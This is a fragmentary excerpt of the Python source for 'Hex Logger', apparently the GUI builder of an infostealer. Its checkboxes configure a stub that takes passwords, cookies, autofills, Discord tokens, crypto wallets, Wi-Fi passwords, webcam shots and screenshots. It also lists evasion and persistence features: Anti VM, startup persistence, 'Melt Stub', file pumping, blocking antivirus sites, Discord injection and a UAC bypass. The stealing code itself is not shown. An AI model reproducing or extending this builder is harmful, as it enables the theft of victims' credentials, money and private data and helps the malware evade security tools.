		...
		if Settings.UpdatesCheck:
			...
			if os.path.isfile(hashFilePath):
				...
				try:
					...
					newhash = json.loads(http.request("GET", timeout= 5).data.decode())["hash"]
...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.pingMeCheckboxControl = ctk.CTkCheckBox(self, text= "Ping Me", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.pingMeVar)
		self.pingMeCheckboxControl.grid(row= 1, column= 0, sticky= "w", padx= 20)

		self.vmProtectCheckboxControl = ctk.CTkCheckBox(self, text= "Anti VM", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.vmProtectVar)
		self.vmProtectCheckboxControl.grid(row= 2, column= 0, sticky= "w", padx= 20)

		self.startupCheckboxControl = ctk.CTkCheckBox(self, text= "Put On Startup", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.startupVar)
		self.startupCheckboxControl.grid(row= 3, column= 0, sticky= "w", padx= 20)

		self.meltCheckboxControl = ctk.CTkCheckBox(self, text= "Melt Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.meltVar)
		self.meltCheckboxControl.grid(row= 4, column= 0, sticky= "w", padx= 20)

		self.pumpStubCheckboxControl = ctk.CTkCheckBox(self, text= "Pump Stub", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", command= self.pumpStub_Event, variable= self.pumpStubVar)
		self.pumpStubCheckboxControl.grid(row= 5, column= 0, sticky= "w", padx= 20)

		self.captureWebcamCheckboxControl = ctk.CTkCheckBox(self, text= "Webcam", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureWebcamVar)
		self.captureWebcamCheckboxControl.grid(row= 1, column= 1, sticky= "w", padx= 20)

		self.capturePasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.capturePasswordsVar)
		self.capturePasswordsCheckboxControl.grid(row= 2, column= 1, sticky= "w", padx= 20)

		self.captureCookiesCheckboxControl = ctk.CTkCheckBox(self, text= "Cookies", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureCookiesVar)
		self.captureCookiesCheckboxControl.grid(row= 3, column= 1, sticky= "w", padx= 20)

		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "History", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureHistoryVar)
		self.captureHistoryCheckboxControl.grid(row= 4, column= 1, sticky= "w", padx= 20)

		self.captureHistoryCheckboxControl = ctk.CTkCheckBox(self, text= "Autofills", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureAutofillsVar)
		self.captureHistoryCheckboxControl.grid(row= 5, column= 1, sticky= "w", padx= 20)

		self.captureDiscordTokensCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureDiscordTokensVar)
		self.captureDiscordTokensCheckboxControl.grid(row= 1, column= 2, sticky= "w", padx= 20)

		self.captureGamesCheckboxControl = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureGamesVar)
		self.captureGamesCheckboxControl.grid(row= 2, column= 2, sticky= "w", padx= 20)

		self.captureWalletsCheckboxControl = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureWalletsVar)
		self.captureWalletsCheckboxControl.grid(row= 3, column= 2, sticky= "w", padx= 20)

		self.captureWifiPasswordsCheckboxControl = ctk.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureWifiPasswordsVar)
		self.captureWifiPasswordsCheckboxControl.grid(row= 4, column= 2, sticky= "w", padx= 20)

		self.captureSysteminfoCheckboxControl = ctk.CTkCheckBox(self, text= "System Info", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureSystemInfoVar)
		self.captureSysteminfoCheckboxControl.grid(row= 1, column= 3, sticky= "w", padx= 20)

		self.captureScreenshotCheckboxControl = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "whie", text_color_disabled= "grey", variable= self.captureScreenshotVar)
		self.captureScreenshotCheckboxControl.grid(row= 2, column= 3, sticky= "w", padx= 20)

		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "whie", text_color_disabled= "grey", variable= self.captureTelegramVar)
		self.captureTelegramChecboxControl.grid(row= 3, column= 3, sticky= "w", padx= 20)

		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text= "Common Files", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
		self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 20)

		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)

		self.blockAvSitesCheckboxControl = ctk.CTkCheckBox(self, text= "Block AV Sites", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.blockAvSitesVar)
		self.blockAvSitesCheckboxControl.grid(row= 2, column= 4, sticky= "w", padx= 20)

		self.discordInjectionCheckboxControl = ctk.CTkCheckBox(self, text= "Discord Injection", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.discordInjectionVar)
		self.discordInjectionCheckboxControl.grid(row= 3, column= 4, sticky= "w", padx= 20)

		self.uacBypassCheckboxControl = ctk.CTkCheckBox(self, text= "UAC Bypass", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "white", text_color_disabled= "grey", variable= self.uacBypassVar)
		...
		self.selectIconButtonControl.grid(row= 6, column= 4, sticky= "ew", padx= (0, 15))
		...
		self.consoleModeButtonControl.grid(row= 6, column= 3, sticky= "ew", padx= (0, 15))
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Hex Logger [File Pumper]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "realicon.ico")))
		self.grab_set()
		...
		self.okButton = ctk.CTkButton(self, text= "OK", font= self.font, fg_color= "#1c1c1c", hover_color= "#1c1c1c", text_color_disabled= "white", command= self.ok_Event)
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Hex Logger [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "realicon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Hex Logger")
		self.iconbitmap(os.path.join("Extras", "realicon.ico"))
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Hex Logger", font= ctk.CTkFont(size= 58, weight= "bold"), text_color= "#ffffff")
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://discord.gg/TRYKSZTYEN")
				exit(0)
